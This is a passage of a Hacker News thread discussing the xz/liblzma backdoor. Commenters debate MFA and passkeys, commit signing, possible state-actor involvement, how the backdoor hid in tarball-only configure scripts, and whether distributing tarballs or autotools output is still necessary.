people put the seeds in their password managers/phones/etc its just more data to steal. Plus, the server/provider side remains a huge weak point too. And the effort of enrolling/giving the user the initial seed is suspect. This is why the FIDO/hardware passkeys/etc are so much better because is basically hardware enforced two way public key auth, done correctly there isn't any way to leak the private keys and its hard has hell to MITM. Which is why loss of the hw is so catastrophic. Most every other MFA scheme is just a bit of extra theater. | | --- | --- | --- | | | |  |  | [jjav](user?id=jjav) [9 months ago](item?id=39872490)   | [root](#39867106) | [parent](#39872180) | [next](#39874247) [–]  > both are just preshared keys Exactly, that's it. Two parties have a shared secret of, say 16 bytes total, upon which authentication depends. They could have a one byte long password but a 15 byte long shared secret used to compute the MFA code. The password is useless but the MFA seed is unguessable. Maybe have no password at all (zero length) and 16 byte seed. Or go the other way and a 16 byte password and zero seed. In terms of an attacker brute forcing the keyspace, it's always the same, 16 bytes. We're basically saying (and as a generalization, this is true) that the password part is useless since people will just keep using their pets name, so let's put the strenght on the seed side. Fair enough, that's true. But if you're willing to use a strong unique password then there's no real need. (As to keyloggers, that's true, but not very interesting. If my machine is already compromised to the level that it has malicious code running logging all my input, it can steal both the passwords and the TOTP seeds and all the website content and filesystem content and so on. Game's over already.) > This is why the FIDO/hardware passkeys/etc are so much better Technically that's true. But in practice, we now have a few megacorporations trying to own your authentication flow in a way that introduces denial of service possibilities. I must control my authentication access, not cede control of it to a faceless corporation with no reachable support. I'd rather go back to using password123 everywhere. | | --- | --- | --- | | | |  |  | [White\_Wolf](user?id=White_Wolf) [9 months ago](item?id=39874247)   | [root](#39867106) | [parent](#39871220) | [prev](#39871280) | [next](#39871720) [–]  Your password is useless when it comes to hardware keyloggers. We run yearly tests to see if people check for "extra hardware". Needles to say we have a very high failure rate. It's hard to get a software keylooger installed on a corp. machine. It's easy to get physical access to the office or even their homes and install keyloggers all over the place and download the data via BT. | | --- | --- | --- | | | |  |  | [jjav](user?id=jjav) [9 months ago](item?id=39876525)   | [root](#39867106) | [parent](#39874247) | [next](#39871720) [–]  > Your password is useless when it comes to hardware keyloggers. You are of course correct. This is where threat modeling comes in. To really say if something is more secure or less secure or a wash, threat modeling needs to be done, carefully considering which threats you want to cover and not cover. I this thread I'm talking from the perspective of an average individual with a personal machine and who is not interesting enough to be targeted by corporate espionage or worse. Thus, the threat of operatives breaking into my house and installing hardware keyloggers on my machines is not part of my threat model. I don't care about that at all, for my personal use. For sensitive company machines or known CxOs and such, yes, but that's a whole different discussion and threat model exercise. | | --- | --- | --- | | | |  |  | [12\_throw\_away](user?id=12_throw_away) [9 months ago](item?id=39871720)   | [root](#39867106) | [parent](#39871220) | [prev](#39874247) | [next](#39870394) [–]  > But if your (like my) passwords are 128+bits out of /dev/random, MFA isn't adding value. no. a second factor of authentication is completely orthogonal to password complexity. | | --- | --- | --- | | | |  |  | [rst](user?id=rst) [9 months ago](item?id=39870394)   | [root](#39867106) | [parent](#39868596) | [prev](#39869336) | [next](#39872781) [–]  Which helps with some kinds of threats, but not all. It keeps someone from pretending to be the maintainer -- but if an actual maintainer is compromised, coerced, or just bad from the start and biding their time, they can still do whatever they want with full access rights. | | --- | --- | --- | | | |  |  | [the8472](user?id=the8472) [9 months ago](item?id=39870675)   | [root](#39867106) | [parent](#39870394) | [next](#39872781) [–]  You probably should have replied that to the GP, not me. I only clarified that what they were suggesting already is the case. | | --- | --- | --- | | | |  |  | [beginner\_](user?id=beginner_) [9 months ago](item?id=39872781)   | [root](#39867106) | [parent](#39867911) | [prev](#39868596) | [next](#39868294) [–]  Not MFA but git commit signing. I don't get why such core low-level projects don't mandate it. MFA doesn0t help if a github access token is stolen and I bet most of use such a token for pushing from an IDE. Even if an access token to github is stolen, the sudden lack of signed commit should raise red flags. github should allow projects to force commit signing (if not already possible). Then the access token plus the singing key would need to be stolen. But of course all that doesn't help in the here more likley scenario of a long con by a state-sponsored hacker or in case of duress (which in certain countries seems pretty likley to happen) | | --- | --- | --- | | | |  |  | [account42](user?id=account42) [9 months ago](item?id=39928141)   | [root](#39867106) | [parent](#39872781) | [next](#39868294) [–]  Git signing would not have helped here. In fact, the tags and release archives *were* signed. | | --- | --- | --- | | | |  |  | [\_\_s](user?id=__s) [9 months ago](item?id=39868294)   | [root](#39867106) | [parent](#39867911) | [prev](#39872781) | [next](#39867867) [–]  This seems like a great way to invest in supporting open source projects in meantime if these projects are being used by these actors. Just have to maintain an internal fork without the backdoors Maybe someone can disrupt the open source funding problem by brokering exploit bounties /s | | --- | --- | --- | | | |  |  | [ametrau](user?id=ametrau) [9 months ago](item?id=39867867)   | [parent](#39867106) | [prev](#39867911) | [next](#39898393) [–]  Probably a state actor. You can look far into the future when you’re working for the party. | | --- | --- | --- | | | |  |  | [calvinmorrison](user?id=calvinmorrison) [9 months ago](item?id=39870209)   | [root](#39867106) | [parent](#39867867) | [next](#39868441) [–]  Which like, also wouldn't be totally weird if I found out that the xz or whatever library maintainer worked for the DoE as a researcher? I kind of expect governments to be funding this stuff. | | --- | --- | --- | | | |  |  | [CanaryLayout](user?id=CanaryLayout) [9 months ago](item?id=39872345)   | [root](#39867106) | [parent](#39870209) | [next](#39868441) [–]  From what I read on masto, the original maint had personal life breakdown, etc. Their interest in staying as primary maint is gone. This is a very strong argument for FOSS to pick up the good habit of ditching/un-mainlining projects where they are sitting around for state actors to volunteer injecting commits to, and dep-stripping active projects from this cruft. Who wants to maintain on a shitty compression format? Someone who is dephunting, it turns out. Okay so your pirate-torrent person needs liblzma.so Offer it in the scary/oldware section of the package library that you need to hunt down the instructions to turn on. Let the users see that it's marked as obsolete, enterprises will see that it should go on the banlist. | | --- | --- | --- | | | |  |  | [Bulat\_Ziganshin](user?id=Bulat_Ziganshin) [9 months ago](item?id=39874073)   | [root](#39867106) | [parent](#39872345) | [next](#39872415) [–]  Collin worked on XZ and its predecessor ~15 years. It seems that he did that for free, at least in recent times. Anyone will lose motivation to work for free over this period of time. At the same time, XZ became a cornerstone of major Linxus distributions, being systemd dependency and loaded, in particular, as part of sshd. What could go wrong? In hindsight, the commercial idea of Red Hat, utilizing the free work of thousands of developers working "just for fun", turned out to be not so brilliant. | | --- | --- | --- | | | |  |  | [wannacboatmovie](user?id=wannacboatmovie) [9 months ago](item?id=39876720)   | [root](#39867106) | [parent](#39874073) | [next](#39872415) [–]  On the contrary, this is a good example for why 'vulnerable' OSS projects that have become critical components, for which the original developer has abandoned or lost interest, should be turned over to an entity like RedHat who can assign a paid developer. It's important to do this before some cloak and dagger rando steps out of the shadows to offer friendly help, who oh by the way happens to be a cryptography and compression expert. A lot of comments in this thread seem to be missing the forest for the trees: this was a multiyear long operation that targeted a vulnerable developer of a heavily-used project. This was not the work of some lone wolf. The amount of expertise needed and the amount of research and coordination needed to execute this required hundreds of man-hours. The culprits likely had a project manager.... Someone had to stalk out OSS developers to find out who was vulnerable (the xz maintainer had publicly disclosed burnout/mental health issues); then the elaborate trap was set. The few usernames visible on GitHub are like pulling a stubborn weed that pops up in the yard... until you start pulling on it you don't realize the extensive reality lying beneath the surface. The implied goal here was to add a backdoor into production Debian and Red Hat EL. Something that would take years to execute. This was NOT the work of one person. | | --- | --- | --- | | | |  |  | [soraminazuki](user?id=soraminazuki) [9 months ago](item?id=39872415)   | [root](#39867106) | [parent](#39872345) | [prev](#39874073) | [next](#39868441) [–]  Um, what? This incident is turning into such a big deal because xz is deeply ingrained as a core dependency in the software ecosystem. It's not an obscure tool for "pirates." | | --- | --- | --- | | | |  |  | [DrewRWx](user?id=DrewRWx) [9 months ago](item?id=39868441)   | [root](#39867106) | [parent](#39867867) | [prev](#39870209) | [next](#39898393) [–]  And that long term perspective could be used constructively instead! | | --- | --- | --- | | | |  |  | [dang](user?id=dang) [9 months ago](item?id=39898393)   | [parent](#39867106) | [prev](#39867867) | [next](#39875953) [–]  (I detached this subthread from <https://news.ycombinator.com/item?id=39866275>, for the sake of pruning the top heavy thread.) | | --- | --- | --- | | | |  |  | [lucasRW](user?id=lucasRW) [9 months ago](item?id=39875953)   | [parent](#39867106) | [prev](#39898393) | [next](#39870026) [–]  More likely that the account of that dev was breawched, dont you think ? | | --- | --- | --- | | | |  |  | [moritonal](user?id=moritonal) [9 months ago](item?id=39870026)   | [parent](#39867106) | [prev](#39875953) | [next](#39874942) [–]  Warning, drunk brain talking. But a LLM driven email based "collaborator" could play a very long gMw adding basic features to a code made whilst earning trust backed by a generated online presence. My money is on a resurgance in the Web of Trust. | | --- | --- | --- | | | |  |  | [jnxx](user?id=jnxx) [9 months ago](item?id=39870254)   | [root](#39867106) | [parent](#39870026) | [next](#39870162) [–]  The web of trust is a really nice idea, but it works badly against that kind of attacks. Just consider that in the real world, most living people (all eight billions) are linked by only six degrees of separation. It really works, for code and for trusted social relations (like "I lend you 100 bucks and you pay me them back when you get your salary") mostly when you know the code author in person. This is also not a new insight. In the beginning of the naughties, there was a web site named kuro5hin.org, which experiemented with user ratings and trust networks. It turned out impossible to prevent take-overs. | | --- | --- | --- | | | |  |  | [groby\_b](user?id=groby_b) [9 months ago](item?id=39870419)   | [root](#39867106) | [parent](#39870254) | [next](#39872830) [–]  IIRC, kuro5hin and others all left out a crucial step in the web-of-trust approach: There were absolutely no repercussions when you extended trust to somebody who later turned out to be a bad actor. It considers trust to be an individual metric instead of leaning more into the graph. (There are other issues, e.g. the fact that "trust" isn't a universal metric either, but context dependent. There are folks whom you'd absolutely trust to e.g. do great & reliable work in a security context, but you'd still not hand them the keys to your car) At least kuro5hin modeled a degradation of trust over time, which most models *still* skip. It'd be a useful thing, but we have a long way to go before there's a working version. | | --- | --- | --- | | | |  |  | [account42](user?id=account42) [9 months ago](item?id=39928222)   | [root](#39867106) | [parent](#39870419) | [next](#39872830) [–]  Once you add punishment for handing out trust to bad actors, even in good faith (which you can't prove/disprove anyway), then you also need to somehow provide siginificant rewardsf for handing out trust to good actors - otherwise everyone is going to play it safe and not vouch for anyone and your system becomes useless. | | --- | --- | --- | | | |  |  | [vintermann](user?id=vintermann) [9 months ago](item?id=39872830)   | [root](#39867106) | [parent](#39870254) | [prev](#39870419) | [next](#39870162) [–]  There were experiments back in the day. Slashdot had one system based on randomly assigned moderation duty which worked pretty great actually, except that for the longest time you couldn't sort by it. Kuro5hin had a system which didn't work at all, as you mentioned. But the best was probably Raph Levien's Advogato. That had a web of trust system which actually worked. But had a pretty limited scope (open source devs). Now everyone just slaps an upvote/downvote button on and calls it a day. | | --- | --- | --- | | | |  |  | [vbi8iBEX](user?id=vbi8iBEX) [9 months ago](item?id=39870162)   | [root](#39867106) | [parent](#39870026) | [prev](#39870254) | [next](#39870268) [–]  Clearly a human is even better at it. | | --- | --- | --- | | | |  |  | [cyanydeez](user?id=cyanydeez) [9 months ago](item?id=39870268)   | [root](#39867106) | [parent](#39870026) | [prev](#39870162) | [next](#39870245) [–]  State actors have equaly long horizons to compromise | | --- | --- | --- | | | |  |  | [llmblockchain](user?id=llmblockchain) [9 months ago](item?id=39870245)   | [root](#39867106) | [parent](#39870026) | [prev](#39870268) | [next](#39874942) [–]  State level actor? China? | | --- | --- | --- | | | |  |  | [logankeenan](user?id=logankeenan) [9 months ago](item?id=39875319)   | [root](#39867106) | [parent](#39870245) | [next](#39874942) [–]  You're likely being downvoted because the Github profile looking like east Asian isn't evidence of where the attacker/attackers are from. Nation states will go to long lengths to disguise their identity. Using broken Russian English when they are not Russian, putting comments in the code of another language, and all sorts of other things to create misdirection. | | --- | --- | --- | | | |  |  | [llmblockchain](user?id=llmblockchain) [9 months ago](item?id=39876845)   | [root](#39867106) | [parent](#39875319) | [next](#39928234) [–]  That's certainly true-- at the very least it "seems" like Asian, but it could very well be from any nation. If they were patient enough to work up to this point they would likely not be dumb enough to leak such information. | | --- | --- | --- | | | |  |  | [account42](user?id=account42) [9 months ago](item?id=39928234)   | [root](#39867106) | [parent](#39875319) | [prev](#39876845) | [next](#39874942) [–]  Otoh with these kind of kneejerk "antiracist" reactions the best way to disguise a chinese operative becomes to prentend you're chinese. | | --- | --- | --- | | | |  |  | [the\_errorist](user?id=the_errorist) [9 months ago](item?id=39874942)   | [prev](#39867106) | [next](#39866263) [–]  Looks like Lasse Collin has commented on LKML: <https://lkml.org/lkml/2024/3/30/188> Also, some info here: <https://tukaani.org/xz-backdoor/> | | --- | --- | --- | | | |  |  | [jwilk](user?id=jwilk) [9 months ago](item?id=39876186)   | [parent](#39874942) | [next](#39866263) [–]  Or if you can't stand the lkml.org UI: [https://lore.kernel.org/lkml/20240330144848.102a1e8c@kaneli/](https://lore.kernel.org/lkml/20240330144848.102a1e8c%40kaneli/) | | --- | --- | --- | | | |  |  | [bawolff](user?id=bawolff) [9 months ago](item?id=39866263)   | [prev](#39874942) | [next](#39867593) [–]  The terrifying part is that this was primarily found because the backdoor was poorly made and causing performance problems. Makes you wonder what more competent actors can do. | | --- | --- | --- | | | |  |  | [rwmj](user?id=rwmj) [9 months ago](item?id=39866501)   | [parent](#39866263) | [next](#39866664) [–]  I've analysed the backdoor myself and it's very sophisticated, not poorly made at all. The performance problem is surprising in this context, but I think next time they won't make that mistake. | | --- | --- | --- | | | |  |  | [bawolff](user?id=bawolff) [9 months ago](item?id=39868201)   | [root](#39866263) | [parent](#39866501) | [next](#39866608) [–]  I guess it seems like the operational parts are a bit poorly done. Valgrind issues, adding a new version with symbols removed, the aforementioned performance issues. Like i would assume the type of person who would do this sort of thing, over a 2 year period no less, would test extensively and be sure all their i's are dotted. Its all kind of surprising given how audacious the attack is. | | --- | --- | --- | | | |  |  | [dist-epoch](user?id=dist-epoch) [9 months ago](item?id=39868281)   | [root](#39866263) | [parent](#39868201) | [next](#39869406) [–]  There are so many variations of Linux/FreeBSD and weird setups and environments that it's almost guaranteed that you'll hit a snag somewhere if you do any major modification like inserting a backdoor. | | --- | --- | --- | | | |  |  | [bombcar](user?id=bombcar) [9 months ago](item?id=39868714)   | [root](#39866263) | [parent](#39868281) | [next](#39869915) [–]  It's hard enough to get code to work correctly; getting it to be also doing something else is even harder. The way they went around it, however, was brilliant. Completely reduce the variables to directly target whatever it is you're attacking. Reminds me of stuxnet somewhat. | | --- | --- | --- | | | |  |  | [SkiFire13](user?id=SkiFire13) [9 months ago](item?id=39869915)   | [root](#39866263) | [parent](#39868281) | [prev](#39868714) | [next](#39869406) [–]  Note that in this case the backdoor was only inserted in some tarballs and enabled itself only when building deb/rpm packages for x86-64 linux and with gcc and the gnu linker. This should already filter out the most exotic setups and makes it harder to reproduce. | | --- | --- | --- | | | |  |  | [1oooqooq](user?id=1oooqooq) [9 months ago](item?id=39870086)   | [root](#39866263) | [parent](#39869915) | [next](#39869406) [–]  the point we got, when even exploits have to rely on user agent string sniffing. reminds me of the gnu hack discovered because one of the savannah build hosts was some odd architecture the exploit wasn't expecting | | --- | --- | --- | | | |  |  | [rdtsc](user?id=rdtsc) [9 months ago](item?id=39869406)   | [root](#39866263) | [parent](#39868201) | [prev](#39868281) | [next](#39866608) [–]  But they almost got away with it. We could have found ourselves 5 years later with this code in all stable distribution versions, IoT devices etc. Also, we only catch the ones that we ... catch. The ones that do everything perfectly, unless they come out and confess eventually, we don't get to "praise" them for their impeccable work. | | --- | --- | --- | | | |  |  | [Nextgrid](user?id=Nextgrid) [9 months ago](item?id=39866608)   | [root](#39866263) | [parent](#39866501) | [prev](#39868201) | [next](#39866664) [–]  Do you have a writeup or any details as to what it does? The logical thing based on this post is that it hooks the SSH key verification mechanism to silently allow some attacker-controlled keys but I wonder if there's more to it? | | --- | --- | --- | | | |  |  | [rwmj](user?id=rwmj) [9 months ago](item?id=39866904)   | [root](#39866263) | [parent](#39866608) | [next](#39875913) [–]  I was starting one, but the openwall message linked here is far more detailed and gets much further than I did. It's fiendishly difficult to follow the exploit. | | --- | --- | --- | | | |  |  | [dhx](user?id=dhx) [9 months ago](item?id=39875913)   | [root](#39866263) | [parent](#39866608) | [prev](#39866904) | [next](#39866664) [–]  sshd starts with root privileges and then proceeds to, in summary:[1] 1. Parse command line arguments 2. Setup logging 3. Load configuration files 4. Load keys/certificates into memory (notably including private keys) 5. Listen on a socket/port for incoming connections 6. Spawn a child process with reduced permissions (on Linux, using seccomp filters [2]) to respond to each incoming connection request This backdoor executes at order 0 before sshd's main function is invoked, overwriting internal sshd functions with compromised ones. As some ideas of what the backdoor could achieve: 1. Leak server private keys during handshakes with users (including unauthenticated users) allowing the keys to be passively stolen 2. Accept backdoor keys as legitimate credentials 3. Compromise random number generation to disable perfect forward secrecy 4. Execute code on the host (supplied remotely by a malicious user) with the 'root' permissions available to sshd upon launch. On most Linux distributions, systemd-analyze security sshd.service will give a woeful score of 9.6/10 (10 being the worst).[3] There is essentially NO sandboxing used because an assumption is made that you'd want to login as root with sshd (or sudo/su to root) and thus would not want to be restricted in what filesystem paths and system calls your remote shell can then invoke. The same attacker has also added code to Linux kernel build scripts which causes xz to be executed (xz at this point has a backdoor compiled into it) during the build of the Linux kernel where xz compression is used for the resulting image. Using this approach, the attacker can selectively choose to modify certain (or all) Linux kernel builds to do some very nasty things: 1. Leak Wireguard keys allowing them to be passively intercepted. 2. Compromise random number generation, meaning keys may be generated with minimal entropy (see Debian certificate problem from a few years ago). 3. Write LUKS master keys (keys used by dm-crypt for actually decrypting disks) to disks in retrievable format. 4, Introduce remote root code execution vulnerabilities into basic networking features such as TCP/IP code paths. [1] 'main' function: <https://anongit.mindrot.org/openssh.git/tree/sshd.c> [2] [https://anongit.mindrot.org/openssh.git/tree/sandbox-seccomp...](https://anongit.mindrot.org/openssh.git/tree/sandbox-seccomp-filter.c) [3] [https://github.com/gentoo/gentoo/blob/HEAD/net-misc/openssh/...](https://github.com/gentoo/gentoo/blob/HEAD/net-misc/openssh/files/sshd.service.1) | | --- | --- | --- | | | |  |  | [aidenn0](user?id=aidenn0) [9 months ago](item?id=39866664)   | [parent](#39866263) | [prev](#39866501) | [next](#39873115) [–]  So many malicious actors have been caught because they accidentally created a mild annoyance for someone that went on to bird-dog the problem. | | --- | --- | --- | | | |  |  | [londons\_explore](user?id=londons_explore) [9 months ago](item?id=39867231)   | [root](#39866263) | [parent](#39866664) | [next](#39871192) [–]  Which is why a really good backdoor is a one line logic bug somewhere which is fiendishly difficult to trigger. | | --- | --- | --- | | | |  |  | [bombcar](user?id=bombcar) [9 months ago](item?id=39867473)   | [root](#39866263) | [parent](#39867231) | [next](#39869430) [–]  <http://underhanded-c.org> if people want examples of what could (and probably, somewhere, IS) being done. | | --- | --- | --- | | | |  |  | [Lammy](user?id=Lammy) [9 months ago](item?id=39869430)   | [root](#39866263) | [parent](#39867231) | [prev](#39867473) | [next](#39869092) [–]  Like the 2003 Linux kernel attempt <https://lwn.net/Articles/57135/> | | --- | --- | --- | | | |  |  | [tialaramex](user?id=tialaramex) [9 months ago](item?id=39869092)   | [root](#39866263) | [parent](#39867231) | [prev](#39869430) | [next](#39871192) [–]  Sure, however the problem that software is really hard *also* impacts bad actors. So it's probably at least as hard to write that one line logic bug *and have it do exactly what you intended* as to write equivalent real code that works precisely as intended. | | --- | --- | --- | | | |  |  | [entropie](user?id=entropie) [9 months ago](item?id=39871192)   | [root](#39866263) | [parent](#39866664) | [prev](#39867231) | [next](#39867199) [–]  Unrelated: as a dog/pointer lover i really like the term "to bird-dog the problem". Never heard of it (iam from germany though) | | --- | --- | --- | | | |  |  | [umanwizard](user?id=umanwizard) [9 months ago](item?id=39871963)   | [root](#39866263) | [parent](#39871192) | [next](#39867199) [–]  I’m from the U.S. and have never heard it either, and don’t understand what it means. | | --- | --- | --- | | | |  |  | [entropie](user?id=entropie) [9 months ago](item?id=39875222)   | [root](#39866263) | [parent](#39871963) | [next](#39872148) [–]  Pointing dogs (bird dogs) are made to point in the direction where they have perceived game. Good dogs are then not distracted by anything and stand there motionless, sometimes so far that they have to be carried away because they cannot turn away themselves. | | --- | --- | --- | | | |  |  | [65a](user?id=65a) [9 months ago](item?id=39872148)   | [root](#39866263) | [parent](#39871963) | [prev](#39875222) | [next](#39867199) [–]  It's somewhat regional, and it means to hunt down the target at the expense of everything else, as a dedicated hunting dog might. | | --- | --- | --- | | | |  |  | [cpach](user?id=cpach) [9 months ago](item?id=39867199)   | [root](#39866263) | [parent](#39866664) | [prev](#39871192) | [next](#39873115) [–]  Case in point: <https://news.ycombinator.com/item?id=39843930> | | --- | --- | --- | | | |  |  | [yard2010](user?id=yard2010) [9 months ago](item?id=39873115)   | [parent](#39866263) | [prev](#39866664) | [next](#39866581) [–]  You must mean, "Makes you wonder what more competent actors are doing" | | --- | --- | --- | | | |  |  | [pinko](user?id=pinko) [9 months ago](item?id=39866581)   | [parent](#39866263) | [prev](#39873115) | [next](#39867593) [–]  s/can do/have done/ | | --- | --- | --- | | | |  |  | [gmnon](user?id=gmnon) [9 months ago](item?id=39867593)   | [prev](#39866263) | [next](#39868843) [–]  Funny how Lasse Collin started to ccing himself and Jia Tan from 2024-03-20 (that was a day of tons of xz kernel patches), he never did that before. :) [https://lore.kernel.org/lkml/20240320183846.19475-2-lasse.co...](https://lore.kernel.org/lkml/20240320183846.19475-2-lasse.collin%40tukaani.org/) | | --- | --- | --- | | | |  |  | [bombcar](user?id=bombcar) [9 months ago](item?id=39868572)   | [parent](#39867593) | [next](#39868016) [–]  This is extremely suspicious. It looks like someone may have noticed a unmaintained or lightly maintained project related to various things, and moved to take control of it. Otherwhere in the discussion here someone mentions the domain details changed; if you have control of the domain you have control of all emails associated with it. | | --- | --- | --- | | | |  |  | [ncr100](user?id=ncr100) [9 months ago](item?id=39868016)   | [parent](#39867593) | [prev](#39868572) | [next](#39869715) [–]  Also interesting, to me, how the GMail account for the backdoor contributor ONLY appears in the context of "XZ" discussions. Google their email address. Suggests a kind of focus, to me, and a lack of reality / genuineness. | | --- | --- | --- | | | |  |  | [fullstop](user?id=fullstop) [9 months ago](item?id=39868564)   | [root](#39867593) | [parent](#39868016) | [next](#39869715) [–]  This also means that Google might know who they are, unless they were careful to hide behind VPN or other such means. | | --- | --- | --- | | | |  |  | [ui2RjUen875bfFA](user?id=ui2RjUen875bfFA) [9 months ago](item?id=39869715)   | [parent](#39867593) | [prev](#39868016) | [next](#39873116) [–]  those pipe usages are quite suspicious [https://git.kernel.org/pub/scm/linux/kernel/git/next/linux-n...](https://git.kernel.org/pub/scm/linux/kernel/git/next/linux-next.git/tree/scripts/Makefile.lib?h=next-20240328&id=d86bab34742d0a67aeb76a3070bc90f7433b78e3#n528) [https://git.kernel.org/pub/scm/linux/kernel/git/next/linux-n...](https://git.kernel.org/pub/scm/linux/kernel/git/next/linux-next.git/tree/scripts/Makefile.lib?h=next-20240328&id=d86bab34742d0a67aeb76a3070bc90f7433b78e3#n531) pipeing into this shell script which now uses "eval" [https://git.kernel.org/pub/scm/linux/kernel/git/next/linux-n...](https://git.kernel.org/pub/scm/linux/kernel/git/next/linux-next.git/tree/scripts/xz_wrap.sh?h=next-20240328#n36) i guess this will be revisited and removed soon | | --- | --- | --- | | | |  |  | [Hackbraten](user?id=Hackbraten) [9 months ago](item?id=39869887)   | [root](#39867593) | [parent](#39869715) | [next](#39873116) [–]  > pipeing into this shell script which now uses "eval" I don’t actually see an issue with that `eval`. Why would one consider running `xz` followed by `eval`-ing its output more insecure than just running `xz`? If `xz` wants to do shenanigans with the privileges it already has, then it wouldn’t need `eval`’s help for that. | | --- | --- | --- | | | |  |  | [ui2RjUen875bfFA](user?id=ui2RjUen875bfFA) [9 months ago](item?id=39870223)   | [root](#39867593) | [parent](#39869887) | [next](#39871444) [–]  just take a closer look at the analysis <https://www.openwall.com/lists/oss-security/2024/03/29/4> then try to understand the pattern. they backdoored by modifying the build process of packages. now consider the $XZ is also from a backdoored build and the call recognizes in the same way with parameters --robot --version and the shell environment with the hint "xz\_wrap.sh" from the piped process. a lot stuff to recognize for the $XZ process that it run as part of a kernel build. Maybe they put advanced stuff in a backdoored $XZ binary to modify the kernel in a similar way they modified lzma based packages in the build process. | | --- | --- | --- | | | |  |  | [Bulat\_Ziganshin](user?id=Bulat_Ziganshin) [9 months ago](item?id=39871444)   | [root](#39867593) | [parent](#39869887) | [prev](#39870223) | [next](#39873116) [–]  because in order to put backdoor into xz executable, you need to infect its sources. and in order to infect the sources, you need to use a similar technique to hide the modification | | --- | --- | --- | | | |  |  | [bonzini](user?id=bonzini) [9 months ago](item?id=39873116)   | [parent](#39867593) | [prev](#39869715) | [next](#39868843) [–]  "started to cc himself" seems to be simply "contributing to a new project and not having git-send-email fully set up". By default git-send-email Cc the sender, though in practice it's one of the first options one changes. | | --- | --- | --- | | | |  |  | [vhiremath4](user?id=vhiremath4) [9 months ago](item?id=39868843)   | [prev](#39867593) | [next](#39866102) [–]  My favorite part was the analysis of "I'm not really a security researcher or reverse engineer but here's a complete breakdown of exactly how the behavior changes." You only get this kind of humility when you're working with absolute wizards on a consistent basis. | | --- | --- | --- | | | |  |  | [asveikau](user?id=asveikau) [9 months ago](item?id=39866102)   | [prev](#39868843) | [next](#39874234) [–]  That's completely crazy, the backdoor is introduced through a very cryptic addition to the configure script. Just looking at the diff, it doesn't look malicious at all, it looks like build script gibberish. | | --- | --- | --- | | | |  |  | [agwa](user?id=agwa) [9 months ago](item?id=39866161)   | [parent](#39866102) | [next](#39866211) [–]  Thanks to autoconf, we're now used to build scripts looking like gibberish. A perfect place to hide a backdoor. | | --- | --- | --- | | | |  |  | [rwmj](user?id=rwmj) [9 months ago](item?id=39866309)   | [root](#39866102) | [parent](#39866161) | [next](#39870445) [–]  This is my main take-away from this. We must stop using upstream configure and other "binary" scripts. Delete them all and run "autoreconf -fi" to recreate them. (Debian already does something like this I think.) | | --- | --- | --- | | | |  |  | [cesarb](user?id=cesarb) [9 months ago](item?id=39866762)   | [root](#39866102) | [parent](#39866309) | [next](#39867281) [–]  > We must stop using upstream configure and other "binary" scripts. Delete them all and run "autoreconf -fi" to recreate them. I would go further than that: all files which are in a distributed tarball, but not on the corresponding git repository, should be treated as suspect. Distributing these generated autotools files is a relic of times when it could not be expected that the target machine would have all the necessary development environment pieces. Nowadays, we should be able to assume that whoever wants to compile the code can also run autoconf/automake/etc to generate the build scripts from their sources. And other than the autotools output, and perhaps a couple of other tarball build artifacts (like cargo simplifying the Cargo.toml file), there should be no difference between what is distributed and what is on the repository. I recall reading about some project to find the corresponding commit for all Rust crates and compare it with the published crate, though I can't find it right now; I don't know whether there's something similar being done for other ecosystems. | | --- | --- | --- | | | |  |  | [nolist\_policy](user?id=nolist_policy) [9 months ago](item?id=39866976)   | [root](#39866102) | [parent](#39866762) | [next](#39867439) [–]  One small problem with this is that autoconf is not backwards-compatible. There are projects out there that need older autoconf than distributions ship with. | | --- | --- | --- | | | |  |  | [cesarb](user?id=cesarb) [9 months ago](item?id=39867206)   | [root](#39866102) | [parent](#39866976) | [next](#39867026) [–]  The test code generated by older autoconf is not going to be work correctly with newer GCC releases due to the deprecation of implicit int and implicit function declarations (see <https://fedoraproject.org/wiki/Changes/PortingToModernC>), so these projects already have to be updated to work with newer autoconf. | | --- | --- | --- | | | |  |  | [badsectoracula](user?id=badsectoracula) [9 months ago](item?id=39870164)   | [root](#39866102) | [parent](#39867206) | [next](#39867026) [–]  Typing `./configure` wont work but something like `./configure CFLAGS="-Wno-error=implicit-function-declaration"` (or whatever flag) might work (IIRC it is possible to pass flags to the compiler invocations used for checking out the existence of features) without needing to recreate it. Also chances are you can shove that flag in some old `configure.in` and have it work with an old autoconf for years before it having to update it :-P. | | --- | --- | --- | | | |  |  | [rwmj](user?id=rwmj) [9 months ago](item?id=39867026)   | [root](#39866102) | [parent](#39866976) | [prev](#39867206) | [next](#39874093) [–]  There are, and they need to be fixed. | | --- | --- | --- | | | |  |  | [pajko](user?id=pajko) [9 months ago](item?id=39874093)   | [root](#39866102) | [parent](#39866976) | [prev](#39867026) | [next](#39872255) [–]  <https://www.gnu.org/software/autoconf-archive/> | | --- | --- | --- | | | |  |  | [Too](user?id=Too) [9 months ago](item?id=39872255)   | [root](#39866102) | [parent](#39866976) | [prev](#39874093) | [next](#39867439) [–]  Easily solved with Docker. Yes, it sucks to add yet another wrapper but that’s what you get for choosing non backwards compatible tools in the first place. In combination with projects that don’t keep up to date on supporting later versions. | | --- | --- | --- | | | |  |  | [account42](user?id=account42) [9 months ago](item?id=39928347)   | [root](#39866102) | [parent](#39872255) | [next](#39867439) [–]  A yes, let's replace "binary" blobs in release archives with even bigger blobs of mistery goo. | | --- | --- | --- | | | |  |  | [londons\_explore](user?id=londons_explore) [9 months ago](item?id=39867439)   | [root](#39866102) | [parent](#39866762) | [prev](#39866976) | [next](#39875555) [–]  Why do we distribute tarballs at all? A git hash should be all thats needed... | | --- | --- | --- | | | |  |  | [cesarb](user?id=cesarb) [9 months ago](item?id=39867646)   | [root](#39866102) | [parent](#39867439) | [next](#39875555) [–]  > Why do we distribute tarballs at all? A git hash should be all thats needed... A git hash means nothing without the repository it came from, so you'd need to distribute both. A tarball is a self-contained artifact. If I store a tarball in a CD-ROM, and look at it twenty years later, it will still have the same complete code; if I store a git hash in a CD-ROM, without storing a copy of the repository together with it, twenty years later there's a good chance that the repository is no longer available. We could distribute the git hash together with a shallow copy of the repository (we don't actually need the history as long as the commit with its trees and blobs is there), but that's just reinventing a tarball with more steps. (Setting aside that currently git hashes use SHA-1, which is not considered strong enough.) | | --- | --- | --- | | | |  |  | [londons\_explore](user?id=londons_explore) [9 months ago](item?id=39867729)   | [root](#39866102) | [parent](#39867646) | [next](#39875555) [–]  except it isn't reinventing the tarball, because the git hash *forces* verification that every single file in the repo matches that in the release. And git even has support for "compressed git repo in a file" or "shallow git repo in a file" or even "diffs from the last release, compressed in a file". They're called "git bundle"'s. They're literally perfect for software distribution and archiving. | | --- | --- | --- | | | |  |  | [bombcar](user?id=bombcar) [9 months ago](item?id=39868740)   | 